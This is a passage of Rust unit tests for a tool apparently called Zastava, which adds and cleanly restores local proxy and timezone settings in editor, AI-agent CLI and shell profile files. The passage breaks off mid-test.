    #[cfg(target_os = "windows")]
    {
        let gw = state().gateway_port();
        if super::real_user_env("HTTP_PROXY").is_some_and(|v| is_zastava_env_signature(&v, gw)) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod file_tests {
    //! The file side on `FakeFs`: no test reads or writes a real home directory.
    use super::*;
    use crate::sysproxy::ZASTAVA_RC_START;
    use crate::sysproxy::fs::{FakeFs, FsOp};
    use crate::sysproxy::ide::{ide_candidates, ide_env_key};
    use crate::sysproxy::platform::FakePlatform;
    use crate::sysproxy::shell_rc::{
        build_powershell_guard_block_with_tz, build_shell_rc_guard_block_with_tz,
    };
    use std::path::PathBuf;
    use std::sync::Arc;

    const URL: &str = "http://127.0.0.1:8899";
    const HOME: &str = "/home/u";
    const ROOT: &str = "/home/u/AppSup";
    const IDE_DIR: &str = "/home/u/AppSup/Code/User";
    const IDE_FILE: &str = "/home/u/AppSup/Code/User/settings.json";

    struct Env {
        fs: FakeFs,
        p: FakePlatform,
        ctx: FileCtx,
    }

    fn env() -> Env {
        let fs = FakeFs::new();
        fs.create_private_dir_all(Path::new(HOME)).unwrap();
        let ctx = FileCtx::new(
            Arc::new(fs.clone()),
            PathBuf::from(HOME),
            vec![PathBuf::from(ROOT)],
        );
        Env {
            fs,
            p: FakePlatform::new(),
            ctx,
        }
    }

    impl Env {
        fn journal(&self) -> Journal {
            Journal::open(Arc::new(self.fs.clone()), Path::new("/data")).unwrap()
        }
        /// Proxy protection on, `global_terminal` (the shell profiles are written), Unix.
        fn enable(&self, tz: Option<&str>) -> Vec<String> {
            self.apply(Some(URL), tz, CliMode::GlobalTerminal, HostOs::Unix)
                .targets
        }
        fn apply(
            &self,
            proxy: Option<&str>,
            tz: Option<&str>,
            mode: CliMode,
            os: HostOs,
        ) -> FilesApplied {
            let mut j = self.journal();
            let plan = FilePlan {
                proxy_url: proxy,
                port: 8899,
                tz,
                mode,
                os,
                strip_unjournaled_blocks: false,
            };
            apply_files(&mut j, &self.p, &self.ctx, &plan)
        }
        fn disable(&self) -> RecoveryReport {
            let mut j = self.journal();
            disable_files(&mut j, &self.p, Some(&self.ctx), CliMode::GlobalTerminal)
        }
        /// An installed editor: its `User` directory exists, the settings file holds `text`.
        fn ide_with(&self, text: &str, mode: u32) -> PathBuf {
            self.fs.create_private_dir_all(Path::new(IDE_DIR)).unwrap();
            self.fs.put(Path::new(IDE_FILE), text.as_bytes(), mode);
            PathBuf::from(IDE_FILE)
        }
        fn text(&self, p: &Path) -> String {
            String::from_utf8(self.fs.get(p).unwrap()).unwrap()
        }
        /// Edits the file as the user's editor would: same permissions, new content.
        fn user_writes(&self, p: &Path, text: &str) {
            let mode = self.fs.mode(p).unwrap().unwrap();
            self.fs.put(p, text.as_bytes(), mode);
        }
        fn journal_is_empty(&self) -> bool {
            self.journal().is_empty()
        }
    }

    fn raw(text: &str, path: &[&str]) -> Option<String> {
        jsonc::get(text, path).unwrap().map(|f| f.raw.to_string())
    }

    const COMMENTED: &str = "\u{feff}{\r\n\t// my theme\r\n\t\"workbench.colorTheme\": \"Default Dark+\",\r\n\t\"editor.fontSize\": 14 /* px */\r\n}\r\n";

    // --- IDE settings.json -----------------------------------------------------------------

    #[test]
    fn ide_apply_then_restore_is_byte_exact_with_bom_crlf_comments_and_mode() {
        let e = env();
        let ide = e.ide_with(COMMENTED, 0o640);
        let targets = e.enable(None);
        assert!(targets.contains(&"VS Code".to_string()), "{targets:?}");
        let after = e.text(&ide);
        assert!(after.starts_with('\u{feff}'));
        assert!(after.contains("// my theme") && after.contains("/* px */"));
        assert!(
            !after.replace("\r\n", "").contains('\n'),
            "only CRLF line ends"
        );
        jsonc::validate(&after).unwrap();
        assert_eq!(raw(&after, &["http.proxy"]), Some(format!("\"{URL}\"")));
        assert_eq!(
            raw(&after, &[ide_env_key(), "HTTPS_PROXY"]),
            Some(format!("\"{URL}\""))
        );
        assert_eq!(e.fs.mode(&ide).unwrap(), Some(0o640));

        let report = e.disable();
        assert!(!report.has_failures(), "{}", report.summary());
        assert_eq!(e.text(&ide), COMMENTED, "restored byte for byte");
        assert_eq!(e.fs.mode(&ide).unwrap(), Some(0o640));
        assert!(e.journal_is_empty());
    }

    #[test]
    fn files_zastava_created_are_removed_again_while_they_are_bare() {
        let e = env();
        e.fs.create_private_dir_all(Path::new(IDE_DIR)).unwrap();
        let claude = e.ctx.claude_settings();
        e.enable(None);
        assert!(e.fs.get(Path::new(IDE_FILE)).is_some());
        assert!(e.fs.get(&claude).is_some());
        e.disable();
        assert!(
            e.fs.get(Path::new(IDE_FILE)).is_none(),
            "settings.json is gone again"
        );
        assert!(e.fs.get(&claude).is_none());
        if cfg!(unix) {
            assert!(e.fs.get(&e.ctx.home.join(".zshrc")).is_none());
            assert!(e.fs.get(&e.ctx.home.join(".zshenv")).is_none());
        }
        assert!(e.journal_is_empty());
    }

    #[test]
    fn an_empty_object_file_round_trips_exactly() {
        let e = env();
        let ide = e.ide_with("{}\n", 0o644);
        e.enable(None);
        assert!(e.text(&ide).contains("http.proxy"));
        e.disable();
        assert_eq!(e.text(&ide), "{}\n");
    }

    #[test]
    fn a_value_the_user_changed_after_us_is_kept_and_the_rest_is_restored() {
        let e = env();
        let ide = e.ide_with(COMMENTED, 0o644);
        e.enable(None);
        let edited = e.text(&ide).replace(
            &format!("\"http.proxy\": \"{URL}\""),
            "\"http.proxy\": \"http://mine:1\"",
        );
        e.user_writes(&ide, &edited);
        let report = e.disable();
        assert_eq!(report.external(), 1, "{}", report.summary());
        let after = e.text(&ide);
        assert_eq!(
            raw(&after, &["http.proxy"]),
            Some("\"http://mine:1\"".into())
        );
        assert_eq!(
            raw(&after, &["http.proxySupport"]),
            None,
            "our other keys are gone"
        );
        assert_eq!(
            raw(&after, &[ide_env_key()]),
            None,
            "the object we made is gone"
        );
        assert!(after.contains("// my theme") && after.contains("/* px */"));
        jsonc::validate(&after).unwrap();
    }

    #[test]
    fn a_neighbour_key_added_after_us_is_kept() {
        let e = env();
        let ide = e.ide_with(COMMENTED, 0o644);
        e.enable(None);
        let with_neighbour = jsonc::set(&e.text(&ide), &["editor.tabSize"], "2").unwrap();
        e.user_writes(&ide, &with_neighbour);
        e.disable();
        let after = e.text(&ide);
        assert_eq!(raw(&after, &["editor.tabSize"]), Some("2".into()));
        assert_eq!(raw(&after, &["http.proxy"]), None);
        assert_eq!(raw(&after, &["editor.fontSize"]), Some("14".into()));
        assert!(after.starts_with('\u{feff}') && after.contains("// my theme"));
        jsonc::validate(&after).unwrap();
    }

    #[test]
    fn a_variable_the_user_added_to_our_object_keeps_the_object() {
        let e = env();
        let ide = e.ide_with("{\n  \"a\": 1\n}\n", 0o644);
        e.enable(None);
        let mine = jsonc::set(&e.text(&ide), &[ide_env_key(), "MINE"], "\"1\"").unwrap();
        e.user_writes(&ide, &mine);
        e.disable();
        let after = e.text(&ide);
        assert_eq!(raw(&after, &[ide_env_key(), "MINE"]), Some("\"1\"".into()));
        assert_eq!(raw(&after, &[ide_env_key(), "HTTP_PROXY"]), None);
        assert_eq!(raw(&after, &["http.proxy"]), None);
    }

    #[test]
    fn a_comment_inside_the_object_we_made_keeps_the_object() {
        let e = env();
        let ide = e.ide_with("{\n  \"a\": 1\n}\n", 0o644);
        e.enable(None);
        // The user removed our variables and left a note in the (now empty) object.
        let mut t = e.text(&ide);
        for k in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY"] {
            t = jsonc::remove(&t, &[ide_env_key(), k]).unwrap();
        }
        let key = ide_env_key();
        let obj = format!("\"{key}\": {{}}");
        assert!(t.contains(&obj), "{t}");
        t = t.replace(&obj, &format!("\"{key}\": {{ /* mine */ }}"));
        e.user_writes(&ide, &t);
        e.disable();
        let after = e.text(&ide);
        assert!(after.contains("/* mine */"), "{after}");
        assert!(
            jsonc::get(&after, &[key]).unwrap().is_some(),
            "the container stays"
        );
        assert_eq!(raw(&after, &["http.proxy"]), None);
    }

    #[test]
    fn values_the_user_had_before_us_are_the_baseline_and_come_back() {
        let e = env();
        let original = "{\n  \"http.proxy\": \"http://corp:3128\",\n  \"http.proxySupport\": \"on\",\n  // keep\n  \"x\": [1, 2, 3],\n}\n";
        let ide = e.ide_with(original, 0o644);
        e.enable(None);
        assert_eq!(
            raw(&e.text(&ide), &["http.proxy"]),
            Some(format!("\"{URL}\""))
        );
        e.disable();
        assert_eq!(e.text(&ide), original);
    }

    #[test]
    fn damaged_or_ambiguous_files_are_never_written() {
        let cases: [(&str, &[u8]); 5] = [
            ("syntax", b"{\n  \"a\": 1,, \"b\": \n}\n"),
            ("unterminated", b"{\n  \"a\": \"x\n"),
            (
                "duplicate",
                b"{\n  \"http.proxy\": \"a\",\n  \"http.proxy\": \"b\"\n}\n",
            ),
            ("array", b"[1, 2, 3]\n"),
            ("not utf-8", b"{\"a\": \"\xff\xfe\"}\n"),
        ];
        for (name, bytes) in cases {
            let e = env();
            e.fs.create_private_dir_all(Path::new(IDE_DIR)).unwrap();
            e.fs.put(Path::new(IDE_FILE), bytes, 0o644);
            let targets = e.enable(None);
            assert!(
                !targets.contains(&"VS Code".to_string()),
                "{name}: {targets:?}"
            );
            assert!(
                targets.contains(&"Claude Code".to_string()),
                "{name}: the others go on"
            );
            assert_eq!(e.fs.get(Path::new(IDE_FILE)).unwrap(), bytes, "{name}");
            let j = e.journal();
            assert!(
                j.entries()
                    .iter()
                    .all(|r| !r.resource.id().contains("Code/User")),
                "{name}: nothing recorded for the refused file"
            );
            drop(j);
            e.disable();
            assert_eq!(e.fs.get(Path::new(IDE_FILE)).unwrap(), bytes, "{name}");
        }
    }

    #[test]
    fn a_crash_before_the_file_write_leaves_file_and_journal_recoverable() {
        let e = env();
        let original = "{\n  // c\n  \"a\": 1\n}\n";
        let ide = e.ide_with(original, 0o644);
        {
            let mut j = e.journal();
            // intent lands, the file write fails, and so does the clean-up: as if killed there
            e.fs.fail_range(FsOp::WriteAtomic, 1, 2);
            let r = apply_ide_settings(&mut j, &e.p, &e.ctx, &ide, Some(URL), None);
            assert!(r.is_err());
        }
        assert_eq!(e.text(&ide), original, "the file was not touched");
        let mut j = e.journal();
        assert_eq!(j.entries().len(), 1, "the durable intent is still there");
        let report = j.restore_all(&e.p);
        assert_eq!(report.failed(), 0);
        assert_eq!(e.text(&ide), original);
        assert!(j.is_empty());
    }

    #[test]
    fn a_crash_after_the_file_write_before_the_applied_mark_still_restores() {
        let e = env();
        let original = "{\n  \"a\": 1\n}\n";
        let ide = e.ide_with(original, 0o644);
        {
            let mut j = e.journal();
            e.fs.fail_after(FsOp::WriteAtomic, 2); // intent, file write, then "applied" fails
            assert!(apply_ide_settings(&mut j, &e.p, &e.ctx, &ide, Some(URL), None).is_err());
        }
        assert_ne!(e.text(&ide), original, "the write landed");
        let mut j = e.journal();
        let report = j.restore_all(&e.p);
        assert_eq!(report.failed(), 0, "{}", report.summary());
        assert_eq!(e.text(&ide), original);
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_settings_file_keeps_its_link_and_its_target_gets_the_edit() {
        let e = env();
        e.fs.create_private_dir_all(Path::new(IDE_DIR)).unwrap();
        let target = Path::new("/dotfiles/vscode-settings.json");
        let original = "{\n  \"a\": 1\n}\n";
        e.fs.put(target, original.as_bytes(), 0o600);
        e.fs.symlink(Path::new(IDE_FILE), target);
        e.enable(None);
        assert!(
            e.fs.is_symlink(Path::new(IDE_FILE)),
            "the link was not replaced"
        );
        assert!(e.text(target).contains("http.proxy"));
        assert_eq!(e.fs.mode(target).unwrap(), Some(0o600));
        e.disable();
        assert!(e.fs.is_symlink(Path::new(IDE_FILE)));
        assert_eq!(e.text(target), original);
    }

    #[test]
    fn timezone_keys_follow_the_synced_timezone_and_leave_with_it() {
        let e = env();
        let claude = e.ctx.claude_settings();
        let original = "{\n  \"model\": \"opus\"\n}\n";
        e.fs.create_private_dir_all(&e.ctx.home.join(".claude"))
            .unwrap();
        e.fs.put(&claude, original.as_bytes(), 0o644);
        e.enable(Some("Europe/Berlin"));
        let t = e.text(&claude);
        assert_eq!(raw(&t, &["env", "TZ"]), Some("\"Europe/Berlin\"".into()));
        assert_eq!(raw(&t, &["env", "LANG"]), Some("\"en_US.UTF-8\"".into()));
        e.enable(None);
        let t = e.text(&claude);
        assert_eq!(
            raw(&t, &["env", "TZ"]),
            None,
            "no timezone is synced any more"
        );
        assert_eq!(raw(&t, &["env", "LC_ALL"]), None);
        assert_eq!(raw(&t, &["env", "HTTPS_PROXY"]), Some(format!("\"{URL}\"")));
        assert_eq!(raw(&t, &["model"]), Some("\"opus\"".into()));
        e.disable();
        assert_eq!(e.text(&claude), original);
    }

    #[test]
    fn enabling_twice_changes_nothing_and_a_new_port_updates_in_place() {
        let e = env();
        let ide = e.ide_with("{}\n", 0o644);
        e.enable(None);
        let writes = e.fs.write_count();
        let first = e.text(&ide);
        e.enable(None);
        assert_eq!(
            e.fs.write_count(),
            writes,
            "nothing was written the second time"
        );
        let mut j = e.journal();
        let plan = FilePlan {
            proxy_url: Some("http://127.0.0.1:8900"),
            port: 8900,
            tz: None,
            mode: CliMode::GlobalTerminal,
            os: HostOs::Unix,
            strip_unjournaled_blocks: false,
        };
        apply_files(&mut j, &e.p, &e.ctx, &plan);
        drop(j);
        let moved = e.text(&ide);
        assert_ne!(moved, first);
        assert!(moved.contains("127.0.0.1:8900") && !moved.contains("127.0.0.1:8899"));
        e.disable();
        assert_eq!(
            e.text(&ide),
            "{}\n",
            "the original baseline survived the update"
        );
    }

    #[test]
    fn gemini_is_configured_only_when_its_directory_exists() {
        let e = env();
        assert!(!e.enable(None).contains(&"Gemini CLI".to_string()));
        e.disable();
        e.fs.create_private_dir_all(&e.ctx.home.join(".gemini"))
            .unwrap();
        assert!(e.enable(None).contains(&"Gemini CLI".to_string()));
        assert!(e.text(&e.ctx.gemini_settings()).contains("HTTPS_PROXY"));
        e.disable();
        assert!(e.fs.get(&e.ctx.gemini_settings()).is_none());
    }

    #[test]
    fn leftovers_of_a_build_without_a_journal_are_cleaned_once_and_user_values_stay() {
        let e = env();
        let key = ide_env_key();
        let legacy = format!(
            "{{\n  \"http.proxy\": \"{URL}\",\n  \"http.proxySupport\": \"override\",\n  \"{key}\": {{\n    \"HTTP_PROXY\": \"{URL}\",\n    \"HTTPS_PROXY\": \"{URL}\",\n    \"NO_PROXY\": \"localhost,127.0.0.1,::1,.local\",\n    \"FOO\": \"keep\"\n  }},\n  \"editor.fontSize\": 14\n}}\n"
        );
        let ide = e.ide_with(&legacy, 0o644);
        let claude = e.ctx.claude_settings();
        let corp = "{\n  \"env\": {\n    \"HTTPS_PROXY\": \"http://corp:3128\",\n    \"TZ\": \"Europe/Berlin\"\n  }\n}\n";
        e.fs.put(&claude, corp.as_bytes(), 0o644);
        e.disable();
        let t = e.text(&ide);
        assert!(!t.contains("127.0.0.1"), "{t}");
        assert_eq!(raw(&t, &[key, "FOO"]), Some("\"keep\"".into()));
        assert_eq!(raw(&t, &["editor.fontSize"]), Some("14".into()));
        assert_eq!(e.text(&claude), corp, "no Zastava signature, not ours");
        // After the one-time pass a value that looks like ours is left alone.
        let again = jsonc::set(&t, &["http.proxy"], &format!("\"{URL}\"")).unwrap();
        e.user_writes(&ide, &again);
        e.disable();
        assert_eq!(
            raw(&e.text(&ide), &["http.proxy"]),
            Some(format!("\"{URL}\""))
        );
    }

    #[test]
    fn journal_ids_and_logs_name_files_without_the_home_path_or_values() {
        let e = env();
        e.ide_with("{}\n", 0o644);
        e.enable(Some("Europe/Berlin"));
        let j = e.journal();
        assert!(!j.entries().is_empty());
        let shown = format!("{j:?}");
        for entry in j.entries() {
            let id = entry.resource.id();
            assert!(!id.contains(HOME) && !id.contains("127.0.0.1"), "{id}");
        }
        assert!(!shown.contains(HOME) && !shown.contains("127.0.0.1") && !shown.contains("Berlin"));
    }

    #[test]
    fn a_failing_read_skips_that_file_and_records_nothing() {
        let e = env();
        let original = "{\n  \"a\": 1\n}\n";
        let ide = e.ide_with(original, 0o644);
        let mut j = e.journal();
        e.fs.fail_next(FsOp::Read);
        let r = apply_ide_settings(&mut j, &e.p, &e.ctx, &ide, Some(URL), None);
        assert!(r.is_err());
        assert!(j.is_empty(), "no intent for a file that could not be read");
        assert_eq!(e.text(&ide), original);
        // The next file is independent.
        let claude = e.ctx.claude_settings();
        apply_agent_settings(&mut j, &e.p, &e.ctx, &claude, Some(URL), None).unwrap();
        assert!(e.text(&claude).contains("HTTPS_PROXY"));
    }

    // --- shell and PowerShell profiles -------------------------------------------------------

    fn shell_block() -> String {
        build_shell_rc_guard_block_with_tz(URL, 8899, None)
    }

    fn apply_block(e: &Env, file: &Path, block: &str) -> Result<(), String> {
        let mut j = e.journal();
        apply_profile_block(&mut j, &e.p, &*e.ctx.fs, file, block)
    }

    #[test]
    fn a_profile_with_bom_and_crlf_round_trips_and_new_lines_use_crlf() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        let original = "\u{feff}export A=1\r\nalias ll='ls -l'\r\n";
        e.fs.put(&rc, original.as_bytes(), 0o644);
        apply_block(&e, &rc, &shell_block()).unwrap();
        let t = e.text(&rc);
        assert!(t.starts_with(original), "the user's bytes are a prefix");
        assert!(
            !t.replace("\r\n", "").contains('\n'),
            "the block uses CRLF too"
        );
        assert_eq!(e.fs.mode(&rc).unwrap(), Some(0o644));
        e.disable();
        assert_eq!(e.text(&rc), original);
    }

    #[test]
    fn text_the_user_appended_after_the_block_survives_the_restore() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        let original = "export A=1\n";
        e.fs.put(&rc, original.as_bytes(), 0o644);
        apply_block(&e, &rc, &shell_block()).unwrap();
        let appended = format!("{}alias x=y\n", e.text(&rc));
        e.user_writes(&rc, &appended);
        e.disable();
        assert_eq!(e.text(&rc), "export A=1\nalias x=y\n");
    }

    #[test]
    fn a_block_the_user_edited_after_us_is_not_removed() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        e.fs.put(&rc, b"export A=1\n", 0o644);
        apply_block(&e, &rc, &shell_block()).unwrap();
        let edited = e.text(&rc).replace(
            "  export NO_PROXY=",
            "  export MY_OWN=1\n  export NO_PROXY=",
        );
        e.user_writes(&rc, &edited);
        let report = e.disable();
        assert_eq!(report.external(), 1, "{}", report.summary());
        assert_eq!(
            e.text(&rc),
            edited,
            "the file is exactly as the user left it"
        );
    }

    #[test]
    fn partial_repeated_or_embedded_markers_and_non_utf8_are_not_touched() {
        let start = ZASTAVA_RC_START;
        let end = crate::sysproxy::ZASTAVA_RC_END;
        let block = shell_block();
        let cases: Vec<(&str, Vec<u8>)> = vec![
            (
                "start only",
                format!("export A=1\n{start}\nexport B=2\n").into_bytes(),
            ),
            ("end only", format!("export A=1\n{end}\n").into_bytes()),
            (
                "end before start",
                format!("{end}\nx\n{start}\n").into_bytes(),
            ),
            ("two blocks", format!("{block}\n{block}\n").into_bytes()),
            (
                "marker inside a line",
                format!("echo \"{start}\"\n").into_bytes(),
            ),
            (
                "unfinished block",
                format!("{start}\nif true; then\n").into_bytes(),
            ),
            ("not utf-8", b"export A=\"\xff\"\n".to_vec()),
        ];
        for (name, bytes) in cases {
            let e = env();
            let rc = e.ctx.home.join(".zshrc");
            e.fs.put(&rc, &bytes, 0o644);
            assert!(apply_block(&e, &rc, &block).is_err(), "{name}");
            assert_eq!(e.fs.get(&rc).unwrap(), bytes, "{name}");
            e.disable();
            assert_eq!(
                e.fs.get(&rc).unwrap(),
                bytes,
                "{name}: restore does not guess either"
            );
            assert!(e.journal_is_empty(), "{name}");
        }
    }

    #[test]
    fn the_dangerous_old_powershell_else_is_migrated_inside_our_markers_only() {
        let e = env();
        let ps = e
            .ctx
            .home
            .join("Documents")
            .join("PowerShell")
            .join("Microsoft.PowerShell_profile.ps1");
        let start = ZASTAVA_RC_START;
        let end = crate::sysproxy::ZASTAVA_RC_END;
        let old_block = format!(
            "{start}\n$__zastavaUp = $false\ntry {{\n  $__zastavaUp = [bool]([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners() | Where-Object {{ $_.Port -eq 8899 }})\n}} catch {{}}\nif ($__zastavaUp) {{\n  $env:HTTP_PROXY = \"{URL}\"\n  $env:LANG = \"en_US.UTF-8\"\n}} else {{\n  Remove-Item Env:HTTP_PROXY,Env:HTTPS_PROXY,Env:ALL_PROXY,Env:http_proxy,Env:https_proxy,Env:all_proxy,Env:TZ,Env:LANG,Env:LC_TIME,Env:LC_ALL -ErrorAction SilentlyContinue\n}}\n{end}"
        );
        let before = "Write-Host 'hi'\nif ($x) { 1 } else { Remove-Item Env:MINE }\n";
        let after_text = "Set-Alias a b\n";
        e.fs.put(
            &ps,
            format!("{before}\n{old_block}\n{after_text}").as_bytes(),
            0o644,
        );
        let block = build_powershell_guard_block_with_tz(URL, None);
        apply_block(&e, &ps, &block).unwrap();
        let t = e.text(&ps);
        assert!(t.contains(before) && t.contains(after_text));
        assert!(!t.contains(&old_block));
        let inside = &t[t.find(start).unwrap()..t.find(end).unwrap()];
        assert!(
            !inside.contains("else") && !inside.contains("Remove-Item"),
            "{inside}"
        );
        assert!(
            t.contains("else { Remove-Item Env:MINE }"),
            "outside the markers nothing is touched"
        );
        e.disable();
        assert_eq!(
            e.text(&ps),
            format!("{before}{after_text}"),
            "the old block is gone for good"
        );
    }

    #[test]
    fn a_block_the_user_edited_and_the_journal_does_not_know_is_refused() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        let start = ZASTAVA_RC_START;
        let end = crate::sysproxy::ZASTAVA_RC_END;
        let edited = format!("{start}\nexport HTTPS_PROXY=\"http://corp:3128\"\n{end}\n");
        e.fs.put(&rc, edited.as_bytes(), 0o644);
        assert!(apply_block(&e, &rc, &shell_block()).is_err());
        e.disable();
        assert_eq!(e.text(&rc), edited);
    }

    #[test]
    fn a_profile_that_did_not_exist_is_created_and_removed_again() {
        let e = env();
        let rc = e.ctx.home.join(".zshenv");
        apply_block(&e, &rc, &shell_block()).unwrap();
        assert!(e.text(&rc).starts_with(ZASTAVA_RC_START));
        e.disable();
        assert!(e.fs.get(&rc).is_none());
    }

    #[test]
    fn a_profile_that_existed_empty_stays_as_an_empty_file() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        e.fs.put(&rc, b"", 0o644);
        apply_block(&e, &rc, &shell_block()).unwrap();
        e.disable();
        assert_eq!(e.fs.get(&rc), Some(Vec::new()));
        assert_eq!(e.fs.mode(&rc).unwrap(), Some(0o644));
    }

    #[test]
    fn user_text_without_a_final_newline_is_kept_and_only_whitespace_may_differ() {
        let e = env();
        let rc = e.ctx.home.join(".zshrc");
        e.fs.put(&rc, b"export A=1", 0o644);
        apply_block(&e, &rc, &shell_block()).unwrap();
        e.disable();
        assert_eq!(e.text(&rc).trim_end(), "export A=1");
    }

    #[test]
    fn status_sees_a_block_or_the_proxy_in_agent_settings_and_nothing_else() {
        let e = env();
        assert!(!files_show_protection(&e.ctx));
        let rc = e.ctx.home.join(".zshrc");
        e.fs.put(&rc, b"export A=1\n", 0o644);
        assert!(!files_show_protection(&e.ctx));
        apply_block(&e, &rc, &shell_block()).unwrap();
        assert!(files_show_protection(&e.ctx));
        e.disable();
        assert!(!files_show_protection(&e.ctx));
        e.fs.put(
            &e.ctx.claude_settings(),
            format!("{{\"env\": {{\"HTTPS_PROXY\": \"{URL}\"}}}}").as_bytes(),
            0o644,
        );
        assert!(files_show_protection(&e.ctx));
    }

    #[test]
    fn editor_candidates_come_from_the_context_roots_and_need_an_existing_user_dir() {
        let e = env();
        assert!(ide_candidates(&e.ctx).is_empty());
        e.fs.create_private_dir_all(Path::new(IDE_DIR)).unwrap();
        e.fs.create_private_dir_all(Path::new("/home/u/AppSup/Cursor/User"))
            .unwrap();
        let found = ide_candidates(&e.ctx);
        let labels: Vec<&str> = found.iter().map(|(l, _)| *l).collect();
        assert_eq!(labels, ["VS Code", "Cursor"]);
        assert_eq!(found[0].1, Path::new(IDE_FILE));
    }

    #[test]
    fn enable_on_unix_writes_the_profiles_and_disable_puts_them_back() {
        if !cfg!(unix) {
            return;
        }
        let e = env();
        let zshrc = e.ctx.home.join(".zshrc");
        e.fs.put(&zshrc, b"# mine\n", 0o600);
        let bash = e.ctx.home.join(".bash_profile");
        let targets = e.enable(None);
        assert!(
            targets.iter().any(|t| t.starts_with("Терминал")),
            "{targets:?}"
        );
        assert!(e.text(&zshrc).contains(ZASTAVA_RC_START));
        assert!(
            e.fs.get(&e.ctx.home.join(".zshenv")).is_none(),
            "~/.zshenv is never written"
        );
        assert!(
            e.fs.get(&bash).is_none(),
            ".bash_profile is only edited when it exists"
        );
        e.disable();
        assert_eq!(e.text(&zshrc), "# mine\n");
        assert_eq!(e.fs.mode(&zshrc).unwrap(), Some(0o600));
    }

    #[cfg(unix)]
    #[test]
    fn on_a_real_disk_in_a_tempdir_modes_symlinks_and_bytes_survive() {
        use std::os::unix::fs::{PermissionsExt, symlink};
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let user = home.join("AppSup").join("Code").join("User");
        std::fs::create_dir_all(&user).unwrap();
        let real = tmp.path().join("dotfiles").join("settings.json");
        std::fs::create_dir_all(real.parent().unwrap()).unwrap();
        let original = "\u{feff}{\r\n  // mine\r\n  \"a\": \"é\"\r\n}\r\n";
        std::fs::write(&real, original).unwrap();
        std::fs::set_permissions(&real, std::fs::Permissions::from_mode(0o640)).unwrap();
        symlink(&real, user.join("settings.json")).unwrap();
        let rc = home.join(".zshrc");
        std::fs::write(&rc, "export A=1\n").unwrap();
        std::fs::set_permissions(&rc, std::fs::Permissions::from_mode(0o644)).unwrap();

        let fs: Arc<dyn crate::sysproxy::fs::Fs> = Arc::new(crate::sysproxy::fs::RealFs);
        let ctx = FileCtx::new(fs.clone(), home.clone(), vec![home.join("AppSup")]);
        let p = FakePlatform::new();
        let mut j = Journal::open(fs, &tmp.path().join("data")).unwrap();
        let plan = FilePlan {
            proxy_url: Some(URL),
            port: 8899,
            tz: Some("Europe/Berlin"),
            mode: CliMode::GlobalTerminal,
            os: HostOs::Unix,
            strip_unjournaled_blocks: false,
        };
        let targets = apply_files(&mut j, &p, &ctx, &plan).targets;
        assert!(targets.contains(&"VS Code".to_string()), "{targets:?}");
        let link = user.join("settings.json");
        assert!(
            std::fs::symlink_metadata(&link)
                .unwrap()
                .file_type()
                .is_symlink()
        );
        let edited = std::fs::read_to_string(&real).unwrap();
        assert!(
            edited.starts_with('\u{feff}')
                && edited.contains("// mine")
                && edited.contains("http.proxy")
        );
        assert_eq!(
            std::fs::metadata(&real).unwrap().permissions().mode() & 0o7777,
            0o640
        );
        assert!(
            std::fs::read_to_string(&rc)
                .unwrap()
                .contains(ZASTAVA_RC_START)
        );

        let report = disable_files(&mut j, &p, Some(&ctx), CliMode::GlobalTerminal);
        assert!(!report.has_failures(), "{}", report.summary());
        assert_eq!(std::fs::read_to_string(&real).unwrap(), original);
        assert!(
            std::fs::symlink_metadata(&link)
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(
            std::fs::metadata(&real).unwrap().permissions().mode() & 0o7777,
            0o640
        );
        assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
        assert_eq!(
            std::fs::metadata(&rc).unwrap().permissions().mode() & 0o7777,
            0o644
        );
        assert!(
            !home.join(".zshenv").exists(),
            "the file Zastava created is gone"
        );
        assert!(!home.join(".claude").join("settings.json").exists());
        assert!(j.is_empty());
    }

    // --- WP-23: the GUI session is not touched, the NO_PROXY of 2.0.0 stays recognised -------

    #[test]
    fn enable_never_touches_the_user_environment_with_or_without_a_timezone() {
        for tz in [None, Some("Europe/Berlin")] {
            let e = env();
            e.p.seed_env("HTTPS_PROXY", "http://corp:3128");
            e.enable(tz);
            assert_eq!(e.p.os_writes(), 0, "no launchctl / registry write");
            assert!(
                e.p.calls()
                    .iter()
                    .all(|c| !c.contains("user_env") && !c.contains("broadcast")),
                "{:?}",
                e.p.calls()
            );
            assert_eq!(e.p.env_of("HTTPS_PROXY"), Some("http://corp:3128".into()));
            assert_eq!(e.p.env_of("TZ"), None);
        }
    }

    #[test]
    fn every_writer_uses_the_one_no_proxy_constant() {
        let e = env();
        let ide = e.ide_with("{\n  \"a\": 1\n}\n", 0o644);
        e.enable(None);
        assert_eq!(
            raw(&e.text(&ide), &[ide_env_key(), "NO_PROXY"]),
            Some(json_str(NO_PROXY_VALUE))
        );
        let block = build_shell_rc_guard_block_with_tz(URL, 8899, None);
        assert!(block.contains(&format!("NO_PROXY=\"{NO_PROXY_VALUE}\"")));
        let ps = build_powershell_guard_block_with_tz(URL, None);
        assert!(ps.contains(NO_PROXY_VALUE));
    }

    #[test]
    fn a_profile_block_with_the_2_0_0_no_proxy_is_still_ours_and_gets_replaced() {
        let e = env();
        let new_block = build_shell_rc_guard_block_with_tz(URL, 8899, None);
        let old_block = new_block.replace(NO_PROXY_VALUE, crate::sysproxy::NO_PROXY_VALUE_2_0);
        assert_ne!(new_block, old_block);
        assert!(is_generated_block(&old_block));
        assert!(is_generated_block(&new_block));
        let zshrc = Path::new("/home/u/.zshrc");
        e.fs.put(zshrc, format!("# mine\n\n{old_block}\n").as_bytes(), 0o644);
        let targets = e.enable(None);
        assert!(!targets.is_empty());
        let after = e.text(zshrc);
        assert!(after.starts_with("# mine\n"));
        assert!(after.contains(NO_PROXY_VALUE), "refreshed to the new value");
        assert_eq!(after.matches(ZASTAVA_RC_START).count(), 1);
    }

    #[test]
    fn a_settings_file_with_the_2_0_0_no_proxy_is_cleaned_by_its_signature() {
        let e = env();
        let key = ide_env_key();
        let text = format!(
